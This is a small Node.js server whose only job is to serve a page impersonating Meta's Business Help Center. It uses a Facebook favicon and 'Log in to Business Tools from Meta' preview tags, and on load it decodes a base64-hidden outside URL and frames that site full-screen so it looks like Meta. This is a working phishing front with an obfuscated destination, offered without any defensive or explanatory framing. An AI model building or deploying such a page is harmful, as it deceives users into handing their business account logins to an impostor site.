const http = require('http');

const server = http.createServer((req, res) => {
    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/html');
    res.end(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
            <title>Business Help Center</title>
            <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
            <meta property="og:title" content="Get started with business tools from Meta" />
            <meta property="og:description" content="Log in to Business Tools from Meta" />
            <meta property="og:image" content="https://i.imgur.com/fwMCrQ2.jpg" />
            <style>
                html, body {
                    margin: 0;
                    padding: 0;
                    height: 100%;
                    overflow: hidden;
                }
                iframe {
                    width: 100%;
                    height: 100%;
                    border: none;
                }
            </style>
            <script>
                window.onload = function() {
                    var urls = [
                        'aHR0cHM6Ly9uZmN2aWV3ZXIuY29tLw=='
                    ];

                    var randomIndex = Math.floor(Math.random() * urls.length);
                    var encodedUrl = urls[randomIndex];

                    var iframe = document.createElement('iframe');
                    iframe.style.width = '100%';
                    iframe.style.height = '100%';
                    iframe.style.border = 'none';
                    iframe.setAttribute('scrolling', 'no');
                    
                    iframe.src = atob(encodedUrl);

                    document.body.appendChild(iframe);
                };
            </script>
        </head>
        <body>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}/`);
});


